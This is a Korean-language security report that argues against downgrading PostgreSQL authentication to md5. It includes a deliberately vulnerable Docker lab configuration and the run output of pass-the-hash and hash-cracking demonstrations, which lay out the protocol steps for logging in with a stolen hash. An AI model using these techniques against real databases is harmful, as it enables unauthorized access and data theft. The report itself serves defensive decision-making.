# PostgreSQL MD5 다운그레이드 보안 분석 및 실습 보고서

> **문서 목적**: 구형 DB 접근 제어 프로그램 연동을 위한 PostgreSQL의 `md5` 인증 다운그레이드 요구에 대해, 암호학적 오해(충돌 공격 vs 역상 공격)를 바로잡고 실제 발생하는 심각한 침투 취약점(Pass-the-Hash, 초고속 크래킹)을 실증하여 보안팀 및 유관 부서 대응 논리를 제공함.

---

## 목차
1. [배경 및 핵심 쟁점 요약](#1-배경-및-핵심-쟁점-요약)
2. [암호학적 분석: 충돌 공격에 대한 오해와 진실](#2-암호학적-분석-충돌-공격에-대한-오해와-진실)
3. [MD5 적용 시 발생하는 실제 치명적 위협](#3-md5-적용-시-발생하는-실제-치명적-위협)
4. [실습 환경 구성 (Docker Compose & DB 설정)](#4-실습-환경-구성-docker-compose--db-설정)
5. [공격 시연 스크립트 및 실제 실행 결과](#5-공격-시연-스크립트-및-실제-실행-결과)
6. [보안팀 대응 및 아키텍처 권고사항](#6-보안팀-대응-및-아키텍처-권고사항)

---

## 1. 배경 및 핵심 쟁점 요약

* **상황**: 사내 DB 접근 기록 로깅을 위해 도입한 '구형 DB 접근 제어 솔루션'이 PostgreSQL의 현대적 표준 인증 방식인 `scram-sha-256`을 지원하지 못함.
* **보안팀 요청**:
  * `pg_hba.conf`: 인증 방식을 `md5`로 변경
  * `postgresql.conf`: `password_encryption`을 `md5`로 변경
* **사용자 의문**:
  > *"내가 알기로 MD5는 충돌 공격으로 한 방에 뚫리는 신뢰할 수 없는 알고리즘인데, DB 인증을 MD5로 바꾸면 충돌 공격으로 바로 뚫리는 것 아닌가?"*
* **핵심 결론**:
  * **"충돌 공격(Collision Attack)"으로는 DB 인증을 뚫을 수 없습니다.** (암호학적 공격 유형의 혼동)
  * **하지만 MD5를 적용하면 "Pass-the-Hash" 및 "초고속 오프라인 크래킹"에 의해 DB가 완전히 장악됩니다.**
  * 즉, 공격 기법은 다르지만 **MD5로의 다운그레이드는 극도로 위험하며 즉각 중단되어야 함**은 사실입니다.

---

## 2. 암호학적 분석: 충돌 공격에 대한 오해와 진실

### 1) 공격 유형의 구분: 충돌 공격 vs 역상 공격

| 구분 | 충돌 공격 (Collision Attack) | 제1 역상 공격 (Pre-image Attack) | 제2 역상 공격 (2nd Pre-image) |
| :--- | :--- | :--- | :--- |
| **공격 목표** | $H(M_1) = H(M_2)$인 임의의 $M_1 \ne M_2$ 생성 | 이미 주어진 $H$에 대해 $H(M) = H$인 $M$ 역산 | 주어진 $M_1$에 대해 $H(M_2) = H(M_1)$인 $M_2$ 발견 |
| **공격자 권한** | 입력값 2개를 공격자가 직접 조작 가능 | 해시값만 주어지며 원본 입력은 공격자가 정할 수 없음 | 원본 $M_1$이 고정되어 있어 조작 불가 |
| **MD5 취약 여부** | **완전히 붕괴됨 (수 초 내 생성 가능)** | **여전히 불가능 (이론 복잡도 약 $2^{128}$)** | **여전히 불가능 (이론 복잡도 약 $2^{128}$)** |
| **실제 피해 대상** | 전자 서명 위조, TLS 인증서 위조, 파일 무결성 조작 | **패스워드 인증 시스템, 해시 기반 키 교환** | 전자 문서 변조 |

### 2) 왜 충돌 공격으로 DB 로그인을 뚫을 수 없는가?
1. **타겟 패스워드의 고정성**:
   * DB에 저장된 패스워드 해시는 이미 정해진 단 하나의 타겟 해시값($H_{target}$)입니다.
   * 공격자가 임의의 충돌 쌍($M_1, M_2$)을 만들 수 있다 하더라도, 그 해시값이 기존 관리자/사용자의 패스워드 해시($H_{target}$)와 일치할 확률은 $1 / 2^{128}$로 불가능합니다.
   * 기존 사용자의 계정으로 로그인하려면 충돌 공격이 아니라 **'제1 역상 공격(해시 역산)'**이 필요합니다.
2. **PostgreSQL의 동적 난수 솔트(Salt) 챌린지**:
   * PostgreSQL 클라이언트가 접속하면 서버는 매 세션마다 4바이트의 암호학적 난수 `Salt`를 새로 생성하여 전송합니다.
   * 클라이언트는 `md5(md5(password + username) + salt)`를 반환해야 하므로, 공격자가 사전에 미리 계산해 둔 해시 쌍을 주입할 수 없습니다.

---

## 3. MD5 적용 시 발생하는 실제 치명적 위협

충돌 공격은 불가능하지만, PostgreSQL에서 MD5 인증을 사용하는 순간 다음 3가지 치명적 보안 위협에 노출됩니다:

### [위협 1] Pass-the-Hash (해시 전달 공격) - 평문 암호 없이 DB 장악
* **원인 (프로토콜 설계 결함)**:
  * PostgreSQL의 MD5 인증 프로토콜은 클라이언트가 서버로 전송할 토큰을 계산할 때 **평문 비밀번호(Password)를 요구하지 않습니다.**
  * 계산식: `Response = md5( H_stored + Salt )`
  * 여기서 $H_{stored}$는 `pg_authid.rolpassword`에 저장된 32자리 MD5 문자열(`md5(password + username)`)입니다.
* **결과**:
  * 공격자가 SQL Injection, DB 백업 파일 유출, 로그 노출, 설정 파일 등을 통해 **해시값만 획득하면 평문 암호를 풀 필요도 없이 즉시 로그인**할 수 있습니다.
* **SCRAM-SHA-256과의 비교**:
  * `SCRAM-SHA-256`은 서버에 `StoredKey`와 `ServerKey`만 저장됩니다.
  * 인증을 위해서는 클라이언트가 `ClientKey = HMAC(PBKDF2(Password, Salt), "Client Key")`를 증명해야 하므로, DB의 해시 컬럼이 전부 털려도 공격자는 Pass-the-Hash를 수행할 수 없습니다.

### [위협 2] 초고속 오프라인 사전 / 브루트포스 공격
* **원인 (Key Stretching 부재)**:
  * MD5는 연산 비용이 사실상 0에 가까운 초경량 알고리즘입니다. (단 1회의 해싱)
  * 현대 GPU(RTX 4090 기준) 1대로 **초당 1,000억 회(100 GH/s)** 이상의 MD5 연산이 가능합니다.
* **SCRAM-SHA-256과의 비교**:
  * `SCRAM-SHA-256`은 암호학적 키 유도 함수(PBKDF2)를 사용하여 기본 **4,096회 반복 해싱**을 강제합니다.
  * 무차별 대입 공격에 필요한 비용과 시간이 최소 수천 배에서 수만 배 이상 증가합니다.

### [위협 3] 네트워크 스니핑 및 패킷 오프라인 크래킹
* 내부 네트워크(ARP 스푸핑, 스위치 미러링, 와이파이 도청 등)에서 클라이언트와 PostgreSQL 간의 통신 패킷을 캡처하면:
  * 서버가 보낸 4바이트 `Salt`
  * 클라이언트가 보낸 `Client Response`
* 위 2개 값이 평문으로 노출되며, Hashcat (Mode 11100: `PostgreSQL Challenge-Response`)을 통해 수 분 내로 원본 패스워드가 역산됩니다.

---

## 4. 실습 환경 구성 (Docker Compose & DB 설정)

### 디렉터리 구조
```
MD5_psql 뚫기/
├── docker-compose.yml                     # PostgreSQL 18+ 컨테이너 구성
├── config/
│   ├── postgresql.conf                    # password_encryption = md5
│   └── pg_hba.conf                        # host/local all all md5
├── init-scripts/
│   └── 01-init-dummy-data.sql             # MD5 계정 생성 및 사내 기밀 더미 데이터
├── 1_collision_misconception_demo.py      # 충돌 공격 오해 분석 및 실제 충돌 쌍 데모
├── 2_exploit_pass_the_hash.py             # [실제 공격 1] Pass-the-Hash 기밀 탈취
├── 3_exploit_md5_crack.py                 # [실제 공격 2] 초고속 사전 크랙 및 패킷 크래킹
└── README.md
```

### 1) docker-compose.yml
```yaml
services:
  postgres:
    image: postgres:latest
    container_name: postgres_md5_lab
    restart: always
    environment:
      POSTGRES_DB: company_db
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: supersecretpassword123
      POSTGRES_INITDB_ARGS: "--auth-host=md5 --auth-local=md5"
    command:
      - "postgres"
      - "-c"
      - "config_file=/etc/postgresql/postgresql.conf"
      - "-c"
      - "hba_file=/etc/postgresql/pg_hba.conf"
    ports:
      - "5432:5432"
    volumes:
      - ./config/postgresql.conf:/etc/postgresql/postgresql.conf:ro
      - ./config/pg_hba.conf:/etc/postgresql/pg_hba.conf:ro
      - ./init-scripts/01-init-dummy-data.sql:/docker-entrypoint-initdb.d/01-init-dummy-data.sql:ro
      - pgdata:/var/lib/postgresql

volumes:
  pgdata:
```

### 2) 설정 파일
* **`config/postgresql.conf`**:
  ```conf
  listen_addresses = '*'
  port = 5432
  password_encryption = md5
  ```
* **`config/pg_hba.conf`**:
  ```conf
  local   all   all             md5
  host    all   all   0.0.0.0/0 md5
  host    all   all   ::/0      md5
  ```

### 3) PostgreSQL 구동 로그 (공식 경고 발생)
컨테이너 실행 시 PostgreSQL 공식 엔진은 MD5 설정에 대해 다음과 같은 경고를 출력합니다:
```text
WARNING:  setting an MD5-encrypted password
DETAIL:   MD5 password support is deprecated and will be removed in a future release of PostgreSQL.
HINT:     Refer to the PostgreSQL documentation for details about migrating to another password type.
```

---

## 5. 공격 시연 스크립트 및 실제 실행 결과

### [데모 1] 충돌 공격에 대한 오해 검증 (`1_collision_misconception_demo.py`)
중국 산둥대 샤오윈 왕(Xiaoyun Wang) 교수 연구진의 실제 128바이트 충돌 블록 쌍을 파이썬으로 검증합니다.

```bash
$ python3 1_collision_misconception_demo.py
```

**[실제 실행 출력]**:
```text
======================================================================
 1. 실제 MD5 충돌 공격 (Collision Attack) 시연
======================================================================
MD5는 2004년 중국 산둥대 샤오윈 왕(Xiaoyun Wang) 교수 연구진에 의해
충돌 저항성(Collision Resistance)이 완전히 붕괴되었습니다.

[*] 블록 1 크기: 128 bytes
[*] 블록 2 크기: 128 bytes
[*] 두 블록의 일치 여부 (block1 == block2): False (완전히 다른 데이터!)
[*] Block 1 MD5 Hash: 79054025255fb1a26e4bc422aef54eb4
[*] Block 2 MD5 Hash: 79054025255fb1a26e4bc422aef54eb4
[*] 두 해시의 일치 여부: True (해시 충돌 발생!)

 -> 결론: 공격자는 동일한 MD5를 갖는 문서 2개(예: 변조된 계약서)를 만들 수 있습니다.

======================================================================
 2. 왜 충돌 공격으로 PostgreSQL 인증을 뚫을 수 없을까?
======================================================================
... (역상 공격과의 차이 및 4바이트 난수 솔트 방어 메커니즘 증명) ...
```

---

### [실제 익스플로잇 1] Pass-the-Hash 기밀 데이터 탈취 (`2_exploit_pass_the_hash.py`)
공격자는 `app_user`의 비밀번호를 전혀 모른 채, DB에서 유출된 해시 문자열(`md56a4473637a18da137b70dddbc1d39a4b`)만을 이용해 PostgreSQL 프로토콜 패킷을 직접 조립/전송합니다.

```bash
$ python3 2_exploit_pass_the_hash.py
```

**[실제 실행 출력]**:
```text
======================================================================
 [*] PostgreSQL MD5 Pass-the-Hash (해시 전달 공격) 시작
======================================================================
[*] 타겟 서버: 127.0.0.1:5432
[*] 타겟 데이터베이스: company_db
[*] 타겟 계정: app_user
[*] 탈취한 MD5 해시값: md56a4473637a18da137b70dddbc1d39a4b
    (주의: 공격자는 평문 비밀번호를 전혀 모르는 상태입니다!)

[1] 타겟 서버(127.0.0.1:5432)와 TCP 세션 수립 중...
[2] PostgreSQL Startup 패킷 전송 (user, dbname)...
[3] 서버로부터 4바이트 난수 솔트(Salt) 수신 완료!
    - 수신된 Salt (Hex): 0xb87c2fe0

[4] [핵심 취약점 발동] 탈취한 해시와 수신된 Salt로 인증 응답 패킷 조립:
    - 계산식: md5( '6a4473637a18da137b70dddbc1d39a4b' + 0xb87c2fe0 )
    - 최종 계산된 인증 토큰: md5767ea644bb3ad95b1598fdf25cb3e46f
[5] 서버로 인증 패킷('p') 전송 완료.

[+] [SUCCESS] ★★★ 인증 성공 (AuthenticationOk)! ★★★
    -> 평문 비밀번호를 전혀 몰라도 해시만으로 DB 인증 통과에 성공했습니다!

[6] 기밀 데이터 탈취 쿼리 전송 중...

======================================================================
 [탈취 데이터] 회사 1급 기밀 데이터 (company_confidential)
======================================================================
R&D      | PROJ-QUANTUM-9921      | TOP SECRET   | Next-Gen AI Autonomous Trading Core Engine Specs
Finance  | CORP-BANK-ACCOUNTS     | CONFIDENTIAL | Offshore Escrow & Reserve Account Routing Numbers
HR       | EXEC-SALARY-TABLE-2026 | SECRET       | Executive Board Compensation and Bonus Multipliers
Security | VPN-GATEWAY-MASTER-KEY | TOP SECRET   | Global Edge VPN Fallback Pre-Shared Key

======================================================================
 [탈취 데이터] 임직원 급여 및 개인정보 (employee_records)
======================================================================
홍길동  | 보안팀   | gildong.hong@company.internal  | 75000000
김철수  | 인프라팀 | cheolsoo.kim@company.internal  | 82000000
이영희  | DB운영팀 | younghee.lee@company.internal  | 91000000
박대표  | 경영지원 | ceo@company.internal           | 250000000

======================================================================
 [*] Pass-the-Hash 공격 시연 완료: DB 완전 장악 성공!
======================================================================
```

---

### [실제 익스플로잇 2] 초고속 사전 크랙 및 패킷 크래킹 (`3_exploit_md5_crack.py`)
유출된 해시와 네트워크 패킷에서 가로챈 (Salt + Response)로부터 평문 패스워드를 복구하고, 그 패스워드로 로그인하여 세션을 장악합니다.

```bash
$ python3 3_exploit_md5_crack.py
```

**[실제 실행 출력]**:
```text
======================================================================
 [1] DB 유출 해시(pg_authid) 오프라인 고속 사전 공격
======================================================================
[*] 대상 사용자: auditor
[*] 대상 해시값: md56f9cf59d90902a31c3428643e1ebfe3f
[*] 검사 후보 수: 16개 | 소요 시간: 0.000017초
[+] [CRACKED!] 평문 패스워드 발견: 'SecurityAudit123'

======================================================================
 [2] 네트워크 스니핑 패킷 오프라인 크래킹 (Hashcat Mode 11100)
======================================================================
[*] 캡처된 계정: app_user
[*] 캡처된 Salt (4 bytes): 0x12345678
[*] 캡처된 Client Response: md527184e29b084f7a5bc40ccb2034120c5
[*] 크래킹 소요 시간: 0.000017초
[+] [CRACKED!] 패킷으로부터 원본 평문 패스워드 복구: 'Company2026!'

======================================================================
 [3] 크랙된 평문 패스워드로 실제 DB 로그인 검증
======================================================================
[+] [SUCCESS] 사용자 'auditor' (암호: 'SecurityAudit123') 로 DB 로그인 완전 성공!
[*] 세션 정보: auditor | DB: company_db
[*] 서버 버전: PostgreSQL 18.6 (Debian 18.6-1.pgdg13+2)

======================================================================
 [3] 크랙된 평문 패스워드로 실제 DB 로그인 검증
======================================================================
[+] [SUCCESS] 사용자 'app_user' (암호: 'Company2026!') 로 DB 로그인 완전 성공!
[*] 세션 정보: app_user | DB: company_db
[*] 서버 버전: PostgreSQL 18.6 (Debian 18.6-1.pgdg13+2)
```

---

## 6. 보안팀 대응 및 아키텍처 권고사항

### 1) 왜 보안팀의 요청을 그대로 수용하면 안 되는가?
1. **보안의 주객전도**:
   * 보안 통제를 위해 설치한 접근 제어 솔루션 때문에 정작 보호 대상인 핵심 DB의 암호화 체계를 20년 전 취약 알고리즘(MD5)으로 다운그레이드하는 모순이 발생합니다.
2. **보안 인증 및 컴플라이언스 위반**:
   * **ISMS-P 인증 기준(2.7.1 암호정책 정의)**: MD5와 같은 취약한 단방향 암호화 알고리즘의 사용을 명시적으로 금지합니다.
   * **금융보안원 가이드라인**: 패스워드 일방향 암호화 시 솔트(Salt) 적용 및 PBKDF2/SHA-256 이상의 안전한 알고리즘 사용을 의무화하고 있습니다.
3. **PostgreSQL 향후 지원 중단**:
   * PostgreSQL 14부터 `scram-sha-256`이 기본값으로 지정되었으며, 최신 버전에서는 MD5 지원이 공식 Deprecated 처리되어 향후 버전 업그레이드 시 DB 서비스 전체가 중단될 위험이 있습니다.

### 2) 기술적 해결 방안
1. **접근 제어 솔루션 벤더 패치 요청 (최우선)**:
   * PostgreSQL 10 이상을 지원하도록 최신 드라이버(`libpq 10+`) 업데이트 패치를 공식 요청합니다.
2. **접근 기록 수집 아키텍처 전환**:
   * 프로토콜 중간자(인라인 프록시) 방식 대신, PostgreSQL 내부 로깅 확장(`pgaudit`, `pg_stat_statements`) 또는 eBPF 기반 네트워크 모니터링 에이전트를 도입하여 DB 인증 방식을 변경하지 않고도 완벽한 접근 기록을 남길 수 있습니다.
3. **과도기적 임시 조치 (불가피하게 MD5를 유지해야 할 경우)**:
   * **네트워크 통제**: DB 포트(5432)를 오직 해당 접근 제어 솔루션의 고정 IP에서만 접근 가능하도록 방화벽/보안그룹을 극도로 제한.
   * **VPN / mTLS 적용**: 클라이언트와 DB 간 구간에 TLS 상호 인증(Mutual TLS)을 강제하여 네트워크 스니핑 및 해시 탈취를 물리적으로 방어.
